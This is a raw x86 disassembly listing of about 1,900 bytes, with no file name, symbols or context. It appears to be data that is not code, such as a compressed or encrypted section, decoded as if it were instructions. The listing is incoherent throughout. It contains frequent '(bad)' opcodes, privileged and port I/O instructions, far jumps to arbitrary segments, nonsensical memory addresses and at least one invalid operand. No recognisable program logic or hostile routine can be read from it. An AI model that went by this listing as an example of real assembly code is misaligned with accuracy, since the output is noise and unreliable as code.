  417d33:	int    0x8e
  417d35:	stos   DWORD PTR es:[edi],eax
  417d36:	dec    ecx
  417d37:	fwait
  417d38:	ds pushf 
  417d3a:	cmp    al,0x4
  417d3c:	mov    BYTE PTR [edi-0x5e650fa6],dl
  417d42:	lods   eax,DWORD PTR ss:[esi]
  417d44:	inc    ebx
  417d45:	cmp    al,0xde
  417d47:	in     al,0x5b
  417d49:	sbb    DWORD PTR [ebp+0x0],ecx
  417d4c:	pop    eax
  417d4d:	or     eax,0xe41bff4f
  417d52:	jmp    0x45b70a4
  417d57:	je     0x417dd2
  417d59:	jbe    0x417d7f
  417d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d5c:	cwde   
  417d5d:	(bad)  
  417d5e:	pop    edi
  417d5f:	mov    BYTE PTR ds:0x3213f158,cl
  417d65:	dec    ebx
  417d66:	sbb    ebx,DWORD PTR ds:0xde9f9a1a
  417d6c:	(bad)  
  417d6e:	mov    ebp,0x46714ba
  417d73:	test   DWORD PTR [esi-0x53],esp
  417d76:	add    ebp,eax
  417d78:	pop    ds
  417d79:	jmp    0xb727cef2
  417d7e:	call   FWORD PTR [edi]
  417d80:	pusha  
  417d81:	ret    0xf033
  417d84:	xor    al,0x2a
  417d86:	aaa    
  417d87:	js     0x417d34
  417d89:	ss imul ebx,ecx,0xffffffc0
  417d8d:	add    al,0x57
  417d8f:	add    esp,esp
  417d91:	or     DWORD PTR [ecx-0x540ca894],ebp
  417d97:	(bad)  
  417d98:	mov    al,ds:0x62f5fd44
  417d9d:	mov    dl,0x44
  417d9f:	retf   
  417da0:	cmp    al,0xd
  417da2:	push   DWORD PTR [edx]
  417da4:	or     eax,0xc16bbbc
  417da9:	mov    cl,0x50
  417dab:	mov    ecx,0x4573e63c
  417db0:	iret   
  417db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417db2:	retf   0x7f3a
  417db5:	rcl    ebx,0x32
  417db8:	retf   0x228b
  417dbb:	repnz or al,cl
  417dbe:	clc    
  417dbf:	sub    dl,BYTE PTR gs:[ebx+0x48]
  417dc3:	fdiv   QWORD PTR [edi+0x475e6584]
  417dc9:	sub    al,0xa8
  417dcb:	mov    WORD PTR [ebx-0x42],cs
  417dce:	cs push ebp
  417dd0:	jae    0x417e32
  417dd2:	ins    DWORD PTR es:[edi],dx
  417dd3:	dec    ebp
  417dd4:	mov    al,ds:0x1a3a659b
  417dd9:	outs   dx,BYTE PTR ds:[esi]
  417dda:	and    ch,cl
  417ddc:	push   edx
  417ddd:	outs   dx,BYTE PTR fs:[esi]
  417ddf:	sti    
  417de0:	or     DWORD PTR [ebx+0x3e602b],esp
  417de6:	(bad)  
  417de7:	in     eax,0xd3
  417de9:	xor    al,0xdf
  417deb:	imul   edi,DWORD PTR [ebp-0x1c],0xffffffd5
  417def:	scas   al,BYTE PTR es:[edi]
  417df0:	xchg   BYTE PTR [edi],dh
  417df2:	mov    dl,0xfe
  417df4:	daa    
  417df5:	cmp    ebx,DWORD PTR [edi+0x13]
  417df8:	in     al,dx
  417df9:	dec    edx
  417dfa:	clc    
  417dfb:	mov    edi,DWORD PTR [ebp+0x50]
  417dfe:	mov    BYTE PTR [edx-0x4d],cl
  417e01:	sub    al,0xb6
  417e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e04:	pop    es
  417e05:	ret    
  417e06:	xor    al,0xa9
  417e08:	pop    ebp
  417e09:	retf   
  417e0a:	imul   ebp,DWORD PTR [ebx],0xee4d6e04
  417e10:	shl    BYTE PTR [ebp+0x76099f36],cl
  417e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e17:	les    esi,FWORD PTR [edx]
  417e19:	adc    eax,0xffffff8c
  417e1c:	mov    eax,ds:0xcef48e2f
  417e21:	mov    esp,0x3be7ecf
  417e26:	outs   dx,DWORD PTR ds:[esi]
  417e27:	push   cs
  417e28:	rol    BYTE PTR [edi+0x12542ba2],cl
  417e2e:	cmp    ah,dl
  417e30:	sub    ecx,ecx
  417e32:	mov    ecx,0x4c81d9f4
  417e37:	mov    edi,0x7f2992cd
  417e3c:	xchg   edi,eax
  417e3d:	(bad)  
  417e3f:	inc    esp
  417e40:	fsubr  QWORD PTR [edi+0x18]
  417e43:	pop    ebp
  417e44:	mov    al,ds:0x59fd6145
  417e49:	jp     0x417dcf
  417e4b:	mov    ecx,0x3375fd69
  417e50:	mov    esp,0x2136fc4d
  417e55:	outs   dx,DWORD PTR ds:[esi]
  417e56:	push   es
  417e57:	mov    dl,bl
  417e59:	leave  
  417e5a:	mov    BYTE PTR [edi],ch
  417e5c:	cmc    
  417e5d:	repz (bad) 
  417e5f:	jge    0x417e62
  417e61:	adc    edi,DWORD PTR [edx+0x620dc016]
  417e67:	outs   dx,BYTE PTR ds:[esi]
  417e68:	jo     0x417eab
  417e6a:	jns    0x417e26
  417e6c:	inc    ecx
  417e6d:	mov    ds:0xc1b99456,eax
  417e72:	sti    
  417e73:	push   eax
  417e74:	sar    BYTE PTR [ecx+0x62],cl
  417e77:	fisubr DWORD PTR [eax]
  417e79:	dec    ecx
  417e7a:	pop    es
  417e7b:	outs   dx,BYTE PTR ds:[esi]
  417e7c:	adc    edi,edi
  417e7e:	(bad)  
  417e7f:	adc    eax,0xc5759cba
  417e84:	pop    ebx
  417e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e86:	les    edx,FWORD PTR ds:0xfc8113de
  417e8c:	dec    ebx
  417e8d:	cmp    cl,BYTE PTR [edi-0x7c8f205]
  417e93:	fdiv   QWORD PTR [ecx]
  417e95:	pop    ss
  417e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e97:	pop    edx
  417e98:	sbb    eax,DWORD PTR [edx-0x5ecb1c91]
  417e9e:	(bad)  
  417e9f:	or     cl,dl
  417ea1:	jbe    0x417ead
  417ea3:	mov    dl,0x47
  417ea5:	(bad)  
  417ea6:	inc    esi
  417ea7:	cmp    BYTE PTR [ebx],0xef
  417eaa:	jmp    0xddd:0x2d7caeb
  417eb1:	repz test cl,0x8b
  417eb5:	pop    eax
  417eb6:	push   esp
  417eb7:	xchg   eax,esp
  417eb9:	jge    0x417ea1
  417ebb:	xor    dh,0x41
  417ebe:	int3   
  417ebf:	ds stc 
  417ec1:	cmp    al,0x8c
  417ec3:	fsub   DWORD PTR [ecx+0x43]
  417ec6:	adc    dl,ch
  417ec8:	push   ss
  417ec9:	pop    ecx
  417eca:	mov    ebx,0x667b9290
  417ecf:	adc    al,0x46
  417ed1:	mov    dh,0xad
  417ed3:	jmp    0xec8e:0x70669f3e
  417eda:	fistp  QWORD PTR [ecx+edi*2]
  417edd:	pop    ebp
  417ede:	mov    al,0x45
  417ee0:	bound  eax,QWORD PTR [ebp+0x6cada6f0]
  417ee6:	mov    esp,0x3b960136
  417eeb:	push   es
  417eec:	add    eax,0x682b1d37
  417ef1:	imul   DWORD PTR [eax+0x3f2688fe]
  417ef7:	clc    
  417ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef9:	xor    edx,DWORD PTR [eax]
  417efb:	test   DWORD PTR [ebp-0x53b6880],edi
  417f01:	xchg   ecx,eax
  417f02:	push   edx
  417f03:	cmp    BYTE PTR [edi+0x66],cl
  417f06:	and    eax,0x4fd28e54
  417f0b:	cmp    ebp,ecx
  417f0d:	mov    bl,dh
  417f0f:	ins    DWORD PTR es:[edi],dx
  417f10:	xlat   BYTE PTR ds:[ebx]
  417f11:	cdq    
  417f12:	sbb    al,0x3a
  417f14:	cmp    DWORD PTR [esi+0xbe4781e],edx
  417f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f1b:	push   ss
  417f1c:	pusha  
  417f1d:	fld    DWORD PTR [esi]
  417f1f:	cdq    
  417f20:	and    BYTE PTR [eax-0x7e],bh
  417f23:	ss aas 
  417f25:	or     ch,dh
  417f27:	sahf   
  417f28:	and    bl,0xb9
  417f2b:	mov    dh,0xe3
  417f2d:	dec    edi
  417f2e:	sbb    al,0x6d
  417f31:	xchg   esp,eax
  417f32:	or     al,BYTE PTR [esi+0x5c]
  417f35:	js     0x417f5f
  417f37:	mov    edi,0x89575dd0
  417f3c:	(bad)  
  417f3e:	cli    
  417f3f:	cld    
  417f40:	and    eax,0xadd46237
  417f45:	mov    ebx,0xb6603472
  417f4a:	mov    fs,WORD PTR [esi+0x7e]
  417f4d:	add    al,0xb0
  417f4f:	and    bh,BYTE PTR [edx-0x78]
  417f52:	or     dh,bl
  417f54:	sbb    ebp,0x51
  417f57:	mov    esp,0xa767fbac
  417f5c:	mov    cl,0xd2
  417f5e:	mov    cl,0x33
  417f60:	loop   0x417f6f
  417f62:	fs dec esp
  417f64:	ins    DWORD PTR es:[edi],dx
  417f65:	sbb    BYTE PTR [edx+0x1dbb9dc2],dh
  417f6b:	jecxz  0x417fab
  417f6d:	shl    BYTE PTR [esi],0xfc
  417f70:	xor    BYTE PTR [eax],ch
  417f72:	adc    eax,0xc2aeefc1
  417f77:	or     eax,0xd27d2871
  417f7c:	sbb    DWORD PTR [eax+0x3b],ebx
  417f7f:	scas   eax,DWORD PTR es:[edi]
  417f80:	ja     0x417fbe
  417f82:	clc    
  417f83:	sub    bh,BYTE PTR [eax+0x2451a873]
  417f89:	xor    edx,DWORD PTR [eax+0x69]
  417f8c:	stos   DWORD PTR es:[edi],eax
  417f8d:	jb     0x417f5f
  417f8f:	pop    ebp
  417f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f91:	lods   al,BYTE PTR ds:[esi]
  417f92:	or     ah,BYTE PTR [ebp+ebx*8+0x24]
  417f96:	jmp    0x417f9d
  417f98:	pusha  
  417f99:	retf   0x7073
  417f9c:	adc    dl,BYTE PTR [ecx]
  417f9e:	jns    0x417fcb
  417fa0:	aad    0x5
  417fa2:	and    al,0xf6
  417fa4:	pop    eax
  417fa5:	js     0x417ff8
  417fa7:	stos   DWORD PTR es:[edi],eax
  417fa8:	arpl   WORD PTR [ebx+0x7b],ax
  417fab:	or     eax,0x900a844c
  417fb0:	dec    eax
  417fb1:	jno    0x417ffa
  417fb3:	sar    BYTE PTR ds:0xdb00fa4e,cl
  417fb9:	jmp    0xea4f:0xf36b1e4b
  417fc0:	leave  
  417fc1:	mov    DWORD PTR [ebp-0xf00ee19],0x8cd081d
  417fcb:	jns    0x417fdd
  417fcd:	out    dx,al
  417fce:	enter  0x3bf7,0xa7
  417fd2:	mov    eax,ds:0xcecc2890
  417fd7:	adc    DWORD PTR [edi+0x55],edi
  417fda:	jae    0x417fc7
  417fdc:	leave  
  417fdd:	fwait
  417fde:	push   ecx
  417fdf:	imul   eax,DWORD PTR [ebx-0x6d9d9ccf],0x3207b710
  417fe9:	aas    
  417fea:	call   0x4e082a50
  417fef:	and    al,0xc9
  417ff1:	les    ebp,FWORD PTR [eax-0x6c]
  417ff4:	or     ch,BYTE PTR [ebp+esi*1-0x6aaa3b2f]
  417ffb:	and    ch,0x7b
  417ffe:	inc    esp
  417fff:	(bad)  
  418000:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  418002:	test   BYTE PTR [eax],ch
  418004:	sahf   
  418005:	call   0x395cc85
  41800a:	pop    eax
  41800b:	jnp    0x418011
  41800d:	add    edi,ecx
  41800f:	add    al,0x7c
  418011:	daa    
  418012:	and    DWORD PTR [ebx+0x3b],ebp
  418015:	pop    ecx
  418016:	rcl    BYTE PTR [eax+0x7a48886c],0x9f
  41801d:	cli    
  41801e:	stc    
  41801f:	loope  0x41809e
  418021:	mov    esi,DWORD PTR [ebp+edi*8+0xa47249b]
  418028:	out    0x6f,al
  41802a:	std    
  41802b:	jbe    0x417fc2
  41802d:	or     BYTE PTR [edx+eiz*2+0x24],dl
  418031:	pop    esp
  418032:	ficomp DWORD PTR [eax-0x32]
  418035:	ret    0x13e1
  418038:	int    0xb3
  41803a:	adc    edi,DWORD PTR [edi+0x6130bcf1]
  418040:	or     DWORD PTR [edx],esp
  418042:	test   eax,0xb0229c84
  418047:	mov    al,ds:0xae0978b1
  41804c:	and    bl,BYTE PTR [ecx]
  41804e:	push   ss
  41804f:	call   0x429a8aec
  418054:	int3   
  418055:	lods   eax,DWORD PTR ds:[esi]
  418056:	leave  
  418057:	xchg   esi,eax
  418058:	jae    0x4180c6
  41805a:	repz jmp 0x41802c
  41805d:	std    
  41805e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41805f:	dec    ecx
  418060:	pop    esi
  418061:	loopne 0x4180bd
  418063:	outs   dx,DWORD PTR ds:[esi]
  418064:	(bad)  
  418065:	cs ss pop ds
  418068:	std    
  418069:	mov    bh,0x98
  41806b:	loop   0x418030
  41806d:	pop    esi
  41806e:	inc    ebp
  41806f:	mov    ebp,0x9b35438b
  418074:	jo     0x418022
  418076:	imul   BYTE PTR es:[ebp+eax*8+0xa]
  41807b:	inc    ecx
  41807c:	cmp    BYTE PTR [edx-0x6ba286f2],0xd7
  418083:	scas   eax,DWORD PTR es:[edi]
  418084:	inc    eax
  418085:	icebp  
  418086:	jp     0x418058
  418088:	je     0x418063
  41808a:	add    BYTE PTR [ebx],bh
  41808c:	les    ecx,FWORD PTR [eax+0x4055a31a]
  418092:	rcr    BYTE PTR [ecx+0x51],cl
  418095:	pop    ecx
  418096:	sub    dl,ch
  418098:	sbb    al,0xee
  41809a:	jne    0x4180d9
  41809c:	jnp    0x4180c3
  41809e:	clc    
  41809f:	pop    esp
  4180a0:	repz push 0x9ee43ae5
  4180a6:	scas   eax,DWORD PTR es:[edi]
  4180a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180a8:	inc    eax
  4180a9:	jno    0x418104
  4180ab:	xchg   ebp,eax
  4180ac:	xchg   esi,eax
  4180ad:	call   0xa26aa197
  4180b2:	loopne 0x418130
  4180b4:	mov    dh,BYTE PTR [ebp+0x30]
  4180b7:	inc    ebp
  4180b8:	push   cs
  4180b9:	mov    al,ds:0xdb317ce1
  4180be:	cmp    eax,0x666d957
  4180c3:	rcl    BYTE PTR [esi],0xbe
  4180c6:	fist   DWORD PTR [ebx+ecx*2+0x6f717047]
  4180cd:	push   ss
  4180ce:	retf   
  4180cf:	rcr    BYTE PTR [ecx],1
  4180d1:	test   eax,eax
  4180d3:	lods   al,BYTE PTR ds:[esi]
  4180d4:	pop    ebx
  4180d5:	and    al,0xe8
  4180d7:	sbb    cl,dh
  4180d9:	push   ebx
  4180da:	mov    ebx,0x1fab756f
  4180df:	(bad)  
  4180e0:	jae    0x418075
  4180e2:	(bad)  
  4180e3:	ficom  DWORD PTR [esi-0x3bc5f6ac]
  4180e9:	in     al,0x30
  4180eb:	fwait
  4180ec:	cld    
  4180ed:	mov    cl,0x50
  4180ef:	cmp    dl,cl
  4180f1:	aaa    
  4180f2:	inc    edi
  4180f3:	shr    DWORD PTR [ecx+eax*1],1
  4180f6:	xor    al,0x6c
  4180f8:	sbb    BYTE PTR [ebp+0x2e],ch
  4180fb:	cmp    ecx,edi
  4180fd:	shl    BYTE PTR [ebx+0x48],1
  418100:	mov    bh,0x18
  418102:	fcomp  DWORD PTR ds:0xee6aa3a5
  418108:	std    
  418109:	xchg   edi,eax
  41810a:	dec    ecx
  41810b:	int3   
  41810c:	sbb    ch,cl
  41810e:	pop    eax
  41810f:	xor    ax,0x53c
  418113:	sbb    BYTE PTR [esi+edx*2+0x28],cl
  418117:	or     bh,BYTE PTR [edi]
  418119:	cmp    bl,BYTE PTR [esi]
  41811b:	out    dx,eax
  41811c:	sbb    ecx,DWORD PTR [ecx-0x5b]
  41811f:	add    al,0x57
  418121:	call   0x12611da8
  418126:	(bad)  
  418128:	dec    ecx
  418129:	cwde   
  41812a:	mov    ecx,0xb5e2c8bb
  41812f:	test   al,0x97
  418131:	and    DWORD PTR [edx-0x4c33e4e2],eax
  418137:	or     BYTE PTR [eax+0x11],al
  41813a:	push   ds
  41813b:	or     eax,DWORD PTR [esi]
  41813d:	call   0x9c11:0xd4a6c108
  418144:	repnz fs pushf 
  418147:	test   DWORD PTR [ebx+0x5e],ebx
  41814a:	call   0xf25b3e6c
  41814f:	outs   dx,BYTE PTR ds:[esi]
  418150:	(bad)  
  418151:	or     DWORD PTR [edx],ebp
  418153:	sub    al,0x67
  418155:	push   0x4d
  418157:	jnp    0x41816b
  418159:	cmc    
  41815a:	lods   al,BYTE PTR ds:[esi]
  41815b:	mov    ch,0xd9
  41815d:	ror    BYTE PTR ds:0x8231c182,0xc2
  418164:	ins    DWORD PTR es:[edi],dx
  418165:	cs mov al,0xee
  418168:	scas   eax,DWORD PTR es:[edi]
  418169:	shl    BYTE PTR [edi+0x30fe0324],cl
  41816f:	fs loop 0x4181e2
  418172:	call   0xea79:0x80c8eceb
  418179:	mov    WORD PTR [esi+0x7a],es
  41817c:	gs aas 
  41817e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41817f:	fadd   DWORD PTR [ecx-0x43]
  418182:	pushf  
  418183:	cmp    bh,cl
  418185:	pop    esp
  418186:	xchg   esp,eax
  418187:	mov    eax,ds:0x7c8c7a40
  41818c:	jmp    0x775db2eb
  418191:	leave  
  418192:	addr16 add ebx,edx
  418195:	jns    0x418147
  418197:	inc    edx
  418198:	pusha  
  418199:	in     al,dx
  41819a:	cdq    
  41819b:	xor    esp,esp
  41819d:	jo     0x41812e
  41819f:	push   0x2d
  4181a1:	jno    0x4181c9
  4181a3:	mov    BYTE PTR [edx-0x7c],ch
  4181a6:	and    BYTE PTR [ebx],bh
  4181a8:	pop    ebp
  4181a9:	mov    DWORD PTR [edi+0x76],edi
  4181ac:	pop    ss
  4181ad:	or     esp,ecx
  4181af:	cmp    al,ah
  4181b1:	jp     0x418181
  4181b3:	in     eax,0x5e
  4181b5:	pushf  
  4181b6:	jmp    0x418171
  4181b8:	pop    esi
  4181b9:	ss xor ebx,ebp
  4181bc:	add    DWORD PTR [ebx],0x9e3707e4
  4181c2:	ror    BYTE PTR [ebx+0x45bc4c28],1
  4181c8:	push   es
  4181c9:	or     BYTE PTR [ebx+0xec82e66],cl
  4181cf:	mov    ch,0xcc
  4181d1:	push   ecx
  4181d2:	out    dx,al
  4181d3:	push   edx
  4181d4:	repnz lahf 
  4181d6:	and    cl,BYTE PTR [edx+0x33]
  4181d9:	push   edx
  4181da:	faddp  st(3),st
  4181dc:	pop    esi
  4181dd:	mov    esp,0x968a5ea5
  4181e2:	adc    dl,0xd5
  4181e5:	test   DWORD PTR [edi-0x50ff1ff1],eax
  4181eb:	(bad)  
  4181ec:	mov    bl,0xdb
  4181ee:	or     BYTE PTR [edi],bl
  4181f0:	(bad)  
  4181f1:	xchg   esi,eax
  4181f2:	test   BYTE PTR [ebp+0x73],0xa1
  4181f6:	mov    ebp,0x60245992
  4181fb:	rol    DWORD PTR [ecx+0x1b],cl
  4181fe:	daa    
  4181ff:	popa   
  418200:	gs das 
  418202:	hlt    
  418203:	lods   eax,DWORD PTR ds:[esi]
  418204:	push   es
  418205:	sub    edx,DWORD PTR [ecx-0x361504de]
  41820b:	pusha  
  41820c:	cmp    dl,BYTE PTR [ebp-0x7e]
  41820f:	adc    DWORD PTR [ebx],ebp
  418211:	mov    dl,0x1d
  418213:	jp     0x4181a1
  418215:	adc    ebx,DWORD PTR [edi+0x6ede23f5]
  41821b:	ds retf 
  41821d:	jbe    0x418294
  41821f:	rcl    DWORD PTR [ecx+0x31],cl
  418222:	mov    edx,0xc4c19e98
  418227:	sbb    ebx,0x6be72240
  41822d:	mov    ds:0x8b2c380a,eax
  418232:	repnz dec ecx
  418234:	adc    dl,dl
  418236:	or     esp,DWORD PTR ds:0x665f8a45
  41823c:	inc    eax
  41823d:	dec    esp
  41823e:	mov    al,0x7
  418240:	xlat   BYTE PTR ds:[ebx]
  418241:	adc    esp,eax
  418243:	inc    esi
  418244:	ins    BYTE PTR es:[edi],dx
  418245:	mov    ds:0xae745f84,eax
  41824a:	stos   DWORD PTR es:[edi],eax
  41824b:	pop    edi
  41824c:	xchg   BYTE PTR [ebp-0x6c3bc247],bh
  418252:	ins    BYTE PTR es:[edi],dx
  418253:	dec    ebp
  418254:	imul   esp,ecx,0x10
  418257:	push   0xfa384b8a
  41825c:	mov    cl,0xaa
  41825e:	or     DWORD PTR [edi],edi
  418260:	cld    
  418261:	push   edx
  418262:	or     al,BYTE PTR ds:0x15f8158f
  418268:	xlat   BYTE PTR ds:[ebx]
  418269:	jl     0x418272
  41826b:	das    
  41826c:	cli    
  41826d:	mov    ebx,0x2de74b96
  418272:	fiadd  DWORD PTR ds:0x5d2383bd
  418278:	jno    0x418272
  41827a:	or     al,0xb3
  41827c:	(bad)  
  41827d:	icebp  
  41827e:	imul   esp,ecx,0xdd98ed44
  418284:	imul   esp,DWORD PTR [ebp+0x66d8f90],0xc3c77c04
  41828e:	jg     0x418229
  418290:	ret    0x46e7
  418293:	cli    
  418294:	sub    al,bl
  418296:	sub    DWORD PTR [ebp-0x40],0x5e
  41829a:	xlat   BYTE PTR ds:[ebx]
  41829b:	cs and eax,0x8cd2207e
  4182a1:	cmp    bh,BYTE PTR [ecx]
  4182a3:	sub    ch,0x2c
  4182a6:	(bad)  
  4182a8:	or     DWORD PTR [ecx+0x4056c25e],eax
  4182ae:	push   esp
  4182af:	pop    ecx
  4182b0:	push   edx
  4182b1:	lods   eax,DWORD PTR ds:[esi]
  4182b3:	dec    eax
  4182b4:	mov    ebx,0x6988729
  4182b9:	mov    dl,0x94
  4182bb:	shr    DWORD PTR [ebx],1
  4182bd:	fstp   DWORD PTR [eax-0x3d09f3d3]
  4182c3:	pop    ds
  4182c4:	data16 hlt 
  4182c6:	sti    
  4182c7:	cwde   
  4182c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182c9:	out    dx,eax
  4182ca:	iret   
  4182cb:	xor    DWORD PTR [esi+edi*1],0x9039c8b4
  4182d2:	ret    0x9c9f
  4182d5:	cmp    ah,BYTE PTR [edi+edx*4-0x44ecc716]
  4182dc:	mov    ecx,0xa7808225
  4182e1:	mul    cl
  4182e3:	adc    DWORD PTR [ecx-0x62],ebp
  4182e6:	and    eax,esp
  4182e8:	sub    DWORD PTR [ecx-0x12f80d46],0xb600196a
  4182f2:	imul   ebp,DWORD PTR [esp+ecx*1+0x310f3011],0x8de12067
  4182fd:	cmc    
  4182fe:	sub    al,0x66
  418300:	inc    edx
  418301:	or     BYTE PTR [eax*4+0x38f4d3cb],0x2c
  418309:	fstp   st(7)
  41830b:	pop    ds
  41830c:	out    0x81,al
  41830e:	inc    ecx
  41830f:	and    ah,BYTE PTR ds:0xd6eed925
  418315:	ret    0x427d
  418318:	and    DWORD PTR [ebp-0x3d8ff428],0xd5f65d48
  418322:	sbb    al,0xc4
  418324:	jnp    0x418352
  418326:	mov    edx,0xc65bd643
  41832b:	shl    eax,1
  41832d:	or     eax,0x98656825
  418332:	or     eax,0x7150cce1
  418337:	jnp    0x4182c2
  418339:	stos   DWORD PTR es:[edi],eax
  41833a:	xor    eax,0x3e70fbca
  41833f:	stc    
  418340:	pop    ds
  418341:	push   ebp
  418342:	mov    al,ds:0xea538120
  418347:	sar    al,0x54
  41834a:	push   ebx
  41834b:	clc    
  41834c:	and    DWORD PTR [ebp+0x7b],0x994e1ac2
  418353:	adc    DWORD PTR [ecx+0x26af1d5f],0x62b4ed35
  41835d:	push   ss
  41835e:	mov    ds:0x9f9da051,al
  418363:	popa   
  418364:	imul   ebx,DWORD PTR [edi],0x88b2b1b4
  41836a:	jo     0x418312
  41836c:	mov    eax,DWORD PTR ds:0xb740affd
  418372:	call   0xb5fde0bc
  418377:	(bad)  
  418378:	hlt    
  418379:	nop
  41837a:	add    BYTE PTR [edi-0x7620eea5],al
  418380:	dec    edi
  418381:	in     al,0x3a
  418383:	je     0x418340
  418385:	dec    edi
  418386:	call   ebp
  418388:	sub    ecx,DWORD PTR [eax+0x1f]
  41838b:	jmp    0x418327
  41838d:	xor    al,0x2d
  41838f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418390:	(bad)  
  418391:	mov    al,ds:0xe0011925
  418396:	outs   dx,DWORD PTR ds:[esi]
  418397:	cmc    
  418398:	and    ebx,DWORD PTR [esi]
  41839a:	inc    ebx
  41839b:	cmp    al,0x42
  41839d:	mov    ebp,0xbdc0cd2c
  4183a2:	xlat   BYTE PTR ds:[ebx]
  4183a3:	pop    ecx
  4183a4:	fsubr  st,st(4)
  4183a6:	scas   al,BYTE PTR es:[edi]
  4183a7:	mov    dh,0xd0
  4183a9:	adc    eax,0x5718d3bf
  4183ae:	ja     0x4183a6
  4183b0:	imul   ebp,DWORD PTR [esi],0x601d897d
  4183b6:	cmp    al,0x98
  4183b8:	add    eax,0x7413abe
  4183bd:	dec    ecx
  4183be:	xor    eax,0x46e88f0b
  4183c3:	lea    edx,[edx-0x6dc9b2cc]
  4183c9:	fwait
  4183ca:	mov    ch,0x1d
  4183cc:	inc    edx
  4183cd:	int    0x4d
  4183cf:	jae    0x418373
  4183d1:	mov    bh,0xd1
  4183d3:	test   al,0xda
  4183d5:	fistp  DWORD PTR [ebp+0x1db4eb42]
  4183db:	mov    bh,0xf7
  4183dd:	cmp    al,0xad
  4183df:	aad    0xd8
  4183e1:	(bad)  
  4183e2:	fs inc ebp
  4183e4:	das    
  4183e5:	sar    DWORD PTR [edx+0x5c299b6e],cl
  4183eb:	aaa    
  4183ec:	scas   al,BYTE PTR es:[edi]
  4183ed:	fidivr DWORD PTR [edx-0xe]
  4183f0:	push   ebx
  4183f1:	sub    al,0x88
  4183f3:	leave  
  4183f4:	loopne 0x418406
  4183f6:	std    
  4183f7:	or     edx,DWORD PTR [esi+edx*2+0x2b5c1705]
  4183fe:	sbb    eax,0xcb24d9e7
  418403:	out    0x88,al
  418405:	fisttp QWORD PTR [ebx-0x48d91fd8]
  41840b:	fcmovne st,st(7)
  41840d:	sub    eax,0x1a2ce117
  418412:	push   ebx
  418413:	in     eax,0xfc
  418415:	loope  0x4183ed
  418417:	lds    ebp,FWORD PTR fs:[ecx+0x5]
  41841b:	les    ebp,FWORD PTR [ebx]
  41841d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41841e:	or     bl,BYTE PTR [ecx]
  418420:	or     BYTE PTR [esi+ebp*2-0x6],0x47
  418425:	inc    ebp
  418426:	rcr    DWORD PTR [eax-0x649b8861],1
  41842c:	mov    cl,0x23
  41842e:	fs aam 0x1c
  418431:	or     al,al
  418433:	mov    dh,0x1d
  418435:	js     0x4183d1
  418437:	sti    
  418438:	pop    eax
  418439:	jecxz  0x418462
  41843b:	ret    
  41843c:	arpl   WORD PTR [edi],si
  41843e:	add    cl,BYTE PTR [edi+0x0]
  418441:	adc    esp,ecx
  418443:	cmp    ah,BYTE PTR ds:0x91cc3f67
  418449:	xchg   ebx,eax
  41844a:	inc    esi
  41844b:	sub    BYTE PTR [ecx-0x65],bl
  41844e:	mov    eax,0x3e9a7c49
  418453:	add    DWORD PTR [esi+edi*8-0x311540d7],eax
  41845a:	mov    ch,0xe7
  41845c:	sbb    BYTE PTR [edi+0x29450d63],ch
  418462:	inc    ebx
  418463:	and    edi,DWORD PTR [esi-0x1f667eb7]
  418469:	dec    ebp
  41846a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41846b:	cmp    eax,0x422ed18e
  418470:	mov    ?,edi
  418472:	popf   
  418473:	add    dh,cl
  418475:	xchg   esi,eax
  418476:	ins    BYTE PTR es:[edi],dx
  418477:	imul   ecx,eax,0xffffff95
  41847a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41847b:	and    DWORD PTR [edx],0xac62ad99
  418481:	jecxz  0x4184b8
  418483:	or     dh,al
  418485:	mov    esi,0x35517251
  41848a:	xor    eax,0x4bffc47e
  41848f:	mov    eax,ds:0x281e1675
  418494:	or     DWORD PTR [esi+0xe451b92],ebp
  41849a:	mov    eax,0xf4b21934
  41849f:	push   esi
  4184a0:	dec    esp
  4184a1:	int    0x2c
  4184a3:	sbb    BYTE PTR [ebx+0x51173320],bh
  4184a9:	xor    dl,BYTE PTR [ebx+0x44fce9ae]
  4184af:	leave  
  4184b0:	xchg   ecx,eax
  4184b1:	push   ebx
  4184b2:	dec    esp
  4184b3:	mov    DWORD PTR [edi+ebp*4-0x1f],ebx
  4184b7:	stos   DWORD PTR es:[edi],eax
  4184b8:	xlat   BYTE PTR ds:[ebx]
  4184b9:	jl     0x418468
  4184bb:	int    0xdc
  4184bd:	mov    ss,WORD PTR [esi+eax*4-0x8f5431d]
  4184c4:	xor    edx,DWORD PTR [ebx-0x18]
  4184c7:	ds retf 
  4184c9:	mov    esp,0xadd88edc
  4184ce:	stc    
  4184cf:	dec    esi
  4184d0:	dec    esi
  4184d1:	and    BYTE PTR [edx],al
  4184d3:	pop    ebx
  4184d4:	cmp    eax,0x7d511bb0
  4184d9:	(bad)  
  4184da:	lahf   
  4184db:	and    bh,ch
  4184dd:	jl     0x41853e
  4184df:	xor    al,0x1
  4184e1:	xchg   edx,eax
  4184e2:	out    0x1d,al
  4184e4:	call   FWORD PTR [edi-0x35]
  4184e7:	dec    esp
  4184e8:	sbb    BYTE PTR [ecx-0x45fa6dbf],ch
  4184ee:	js     0x4184dd
  4184f0:	push   esp
  4184f1:	push   0x10c6382b
  4184f6:	test   eax,0xafc15058
  4184fb:	enter  0x63bf,0xce
  4184ff:	fdiv   st,st(6)
  418501:	xchg   ecx,eax
  418502:	xlat   BYTE PTR ds:[ebx]
  418503:	jmp    0xe758:0x28a5052a
  41850a:	leave  
  41850b:	fxch   st(2)
  41850d:	pop    edi
